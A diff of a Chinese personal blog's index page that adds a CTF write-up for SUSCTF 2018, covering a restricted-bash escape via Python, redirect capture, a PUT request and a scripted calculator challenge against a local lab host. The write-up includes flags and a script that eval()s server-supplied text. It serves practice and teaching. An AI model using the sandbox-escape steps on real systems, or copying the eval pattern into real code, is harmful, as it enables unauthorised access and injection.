@@ -294,6 +294,98 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-susctf2018-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/06/05/susctf2018-wp/" class="article-date">
+      <time datetime="2018-06-05T12:28:33.000Z" itemprop="datePublished">2018-06-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/05/susctf2018-wp/">SUSCTF 2018 做题记录</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近好久都没做题目，刚好上次搭的题目还在，就不要浪费了，记录记录做题过程吧</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="minBash"><a href="#minBash" class="headerlink" title="minBash"></a>minBash</h3><p>这个题目考的点是沙盒绕过，第一次玩这个东西？？反正进去之后尝试ls,cat,file等各种那个命令均无效果，都会显示<br><code>-rbash: ls: command not found</code><br>发现有一篇好文章，有空瞅瞅:<code>http://cauc.me/2017/11/16/python沙盒绕过/</code><br>一开始谷歌一下，发现解决办法是这样的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br></pre></td></tr></table></figure>
+<p>输入之后发现还是不行显示 <code>-rbash: PATH: readonly variable</code><br>我们可以尝试python里面的库去执行，用的是<code>os</code>库里面的<code>listdir</code>函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.listdir(<span class="string">'.'</span>)</span><br></pre></td></tr></table></figure>
+<p>注意函数里面的<code>.</code>代表的是当前目录，而<code>..</code>代表的是上级目录，也可以是绝对路径<br>得到当前目录的结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;.bash_logout&apos;, &apos;.profile&apos;, &apos;.bashrc&apos;, &apos;bin&apos;, &apos;c8049f64c8080af25f414b15cb6f80c3&apos;]</span><br></pre></td></tr></table></figure>
+<p>检验一下那个一串的东西是文件还是文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; os.path.isfile(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>)</span><br></pre></td></tr></table></figure>
+<p>发现是文件，这里提供两种方法读取文件，<br>第一种直接用Python读取文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">'c8049f64c8080af25f414b15cb6f80c3'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.read()</span><br></pre></td></tr></table></figure>
+<p>得到结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;\n&apos;</span><br></pre></td></tr></table></figure>
+<p>另一种是，返回到Linux命令行用strings命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings c8049f64c8080af25f414b15cb6f80c3</span><br></pre></td></tr></table></figure>
+<p>得到结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUSCTF&#123;e6b729cdf8885b16e7b949e85772e340&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="faster"><a href="#faster" class="headerlink" title="faster"></a>faster</h3><p>题目说的快一点，那就试一下抓包好了，直接得到flag，这里是存在<code>302跳转</code>的，会跳转到<code>1ndex.php</code>，一开始我一直这个页面抓包可坑了，以后要注意直接从打开题目地址那一刻开始抓包-_-||<br><img src="https://s1.ax1x.com/2018/06/05/C7cZ1H.png" alt="C7cZ1H.png"></p>
+<p>还有另一种做法就是直接<code>curl</code>一波就好了。。。不多说，水题一个</p>
+<h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><p>打开题目发现这样一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message then you can get the flag</span><br></pre></td></tr></table></figure>
+<p>这个题目是考了传参的方式，水题。。。。<br>我用的两种办法<br>第一种<br>直接利用火狐的<code>F12</code>插件去完成<code>put类型</code>的传参<br><img src="https://s1.ax1x.com/2018/06/05/C7cmjA.png" alt="C7cmjA.png"><br>查看回应发现一段base64，<code>U3VzY3Rme3JlcXVlc3RfaW5fcHV0X21ldGhvZH0=</code>，解码得到flag</p>
+<p>第二种利用python写脚本上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4447'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line">ans = res.put(url=url,data=<span class="string">'message'</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(ans.content)</span><br></pre></td></tr></table></figure>
+<h3 id="calculator"><a href="#calculator" class="headerlink" title="calculator"></a>calculator</h3><p><img src="https://s1.ax1x.com/2018/06/05/C7cktO.png" alt="C7cktO.png"><br>这个题目明显考的是脚本题。。。没学过bs,只能一直用<code>requests</code>庫了，过段时间还是得学习一下bs</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.1.103:4441'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">ans1 = res.get(url)</span><br><span class="line"><span class="comment"># print ans1.content</span></span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans1.content)</span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">ans = eval(s)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line">		time.sleep(<span class="number">1</span>)</span><br><span class="line">		ans2 = res.post(url=url,data=&#123;<span class="string">"ans"</span>:ans&#125;).content</span><br><span class="line">		calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans2)</span><br><span class="line">		s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">		ans = eval(s)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> ans2</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>先记录着这么多先吧，明天再把剩下的题目完成，赶紧复习一波微机原理，不然明天的汇编又该看不懂了，最近事真多，Yii框架啥的还没写完，烦。。。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Docker-CTFd-building" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -896,75 +988,6 @@
       
         <p class="article-more-link">
           <a href="/2018/04/06/whalectf-web1/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-shiyanba1-wp" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/03/18/shiyanba1-wp/" class="article-date">
-      <time datetime="2018-03-18T02:14:47.000Z" itemprop="datePublished">2018-03-18</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/18/shiyanba1-wp/">实验吧 忘记密码了wp</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>这个题一开始给了一个登录框<br>先不管输入东西抓一个包看一下<br>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2018/03/18/shiyanba1-wp/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
